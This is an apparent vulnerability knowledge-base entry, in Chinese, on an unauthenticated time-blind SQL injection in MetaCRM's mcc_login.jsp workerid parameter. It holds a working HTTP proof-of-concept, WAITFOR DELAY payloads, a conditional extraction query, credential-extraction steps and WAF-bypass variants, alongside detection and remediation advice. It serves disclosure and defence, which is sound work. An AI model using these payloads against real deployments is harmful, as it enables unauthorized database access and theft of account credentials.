---
id: web-generic-sqli-crm-mcc-login-workerid-time-blind
title: MetaCRM mcc_login.jsp workerid 参数拼接 SQL 注入（MSSQL WAITFOR DELAY 时间盲注）
type: scenario
domain: web
path: web/generic/sqli
technique: crm-mcc-login-workerid-sqli
aliases:
- MetaCRM mcc_login 注入
- workerid SQL 注入
- solarun mcc_login.jsp
- MSSQL WAITFOR DELAY 时间盲注
- org_employee scode 注入
tags:
- java
- jsp
- sql-injection
- time-blind
- mssql
- crm
- unauth
- web
cve: []
severity: high
confidence: high
affected_versions: MetaCRM 6.4.2（原文审计源码版本）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:19+08:00'
  notes: 已对照原文与图02/03/04核对：mcc_login.jsp workerid 拼接 scode/sctino、DBManager.getArray→Statement.executeQuery、WAITFOR DELAY 触发 500 且约 9070ms 均一致；affected_versions 收敛为原文审计源码版本 MetaCRM 6.4.2。未验证点：未复现注入。frontmatter 无 sources/source_url。
---

## 一句话结论

MetaCRM 的 `/si/callcenter/solarun/mcc_login.jsp` 把请求参数 `workerid` 直接拼进 `select scode from org_employee where scode = '...' or sctino='...'`，经 `DBManager.getArray` 的 `Statement.executeQuery` 执行，未做预编译；攻击者可闭合单引号并用 MSSQL `WAITFOR DELAY '0:0:9'` 做时间盲注，原文实测请求耗时约 9 秒并返回 500。

## 原理

- **入口**：`mcc_login.jsp` 中 `String userlogin = request.getParameter("workerid")`（坐席登录 ID），随后 `com.metasoft.framework.db.DBManager dm = new DBManager("default")`，执行 `dm.getArray("select scode from org_employee where scode = '" + userlogin + "' or sctino='" + userlogin + "'")`。
- **sink**：`DBManager.getArray(findSql, maxRows)` 中 `Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(findSql);`，SQL 文本由业务层拼接，`findSql` 未经过参数绑定；`getFunTrimSemicolon` 只做分号裁剪，不防注入。
- **为什么可注入**：`workerid` 同时进入 `scode = '...'` 与 `sctino='...'` 两个单引号字符串；提交 `1';WAITFOR DELAY '0:0:9'--` 可闭合第一个单引号并注释掉剩余部分，数据库执行 `WAITFOR DELAY` 造成可控延时。
- **为什么是前台**：该 JSP 位于 `/si/callcenter/solarun/` 登录/坐席路径，代码中未做 `UserManager.getUserBySessionId` 鉴权；原文直接请求即触发。
- **原文验证**：Burp 请求 `GET /si/callcenter/solarun/mcc_login.jsp?workerid=1';WAITFOR+DELAY+'0:0:9'--+`，响应 500，Burp 计时约 9,070 ms，证明 SQL 被执行；响应为 Tomcat 错误页，不是业务正常登录页。

## 触发条件

- 目标部署 MetaCRM，`/si/callcenter/solarun/mcc_login.jsp` 可从攻击面访问。
- `workerid` 进入 `DBManager.getArray` 的拼接 SQL，数据库为 SQL Server（支持 `WAITFOR DELAY`）。
- 接口无需登录；无 WAF 拦截单引号、分号、`WAITFOR`。
- 数据库账号有执行 `WAITFOR` 的权限（普通查询权限即可）。

## 利用步骤

1. 请求 `mcc_login.jsp?workerid=1'` 观察是否出现 SQL 错误/500，确认注入。
2. 用 `workerid=1';WAITFOR+DELAY+'0:0:9'--+` 测试时间盲注，记录响应耗时；再改 5 秒/1 秒确认可控。
3. 用条件时间盲注逐位提取数据库名、表名、`org_employee` 中的账号/口令字段：`1';IF(条件) WAITFOR DELAY '0:0:5'--+`。
4. 也可尝试 `1' or 1=1--` 观察登录逻辑是否被绕过；若返回结果影响页面，可改布尔盲注。
5. 授权测试控制延时与请求频率，避免对生产业务造成压力。

## PoC

```http
GET /si/callcenter/solarun/mcc_login.jsp?workerid=1%27%3BWAITFOR+DELAY+%270%3A0%3A9%27--+ HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: keep-alive
```

```text
原始 payload（Burp 截图）：
workerid=1';WAITFOR DELAY '0:0:9'--+

响应：HTTP/1.1 500 Internal Server Error
耗时：约 9,070 ms（Burp 计时）
```

条件盲注示例（SQL Server）：

```sql
1';IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'--+
```

## 变体与关联

- 变体：`scode` 与 `sctino` 两个拼接点都可注入；可用 `--`、`/* */`、URL 编码空格等绕过简单过滤。
- 变体：若 `WAITFOR` 被 WAF 拦截，可用 `IF ... WAITFOR`、嵌套查询/函数报错或布尔差异替代。
- 关联：[[web-generic-sqli-java-servlet-accountid-concat-boolean]]（同产品 `/headimgsave` 的 AccountPO.getAc 拼接注入，端点与 sink 不同）、[[web-generic-sqli-error-based-extraction]]（MSSQL 报错注入通用手法）。
- 边界：依赖 SQL Server 与可执行延时；若目标为其他数据库，`WAITFOR` 不适用，需换 `pg_sleep`/`sleep` 等。

## 检测与防御

- 检测：`workerid` 参数含 `'`、`;`、`WAITFOR`、`DELAY`、`--`；同一 IP 对 `mcc_login.jsp` 发送的请求耗时异常稳定在 5/9 秒；响应 500 且 SQL 错误信息/堆栈出现。
- 修复：`DBManager.getArray` 改为 `PreparedStatement` 参数绑定；`workerid` 做格式白名单（数字/固定长度工号）；统一异常处理，禁止把 SQL 异常返回客户端。
- 加固：数据库最小权限；WAF 拦截时间盲注关键字（不能替代预编译）；对登录接口做频率限制与耗时监控。
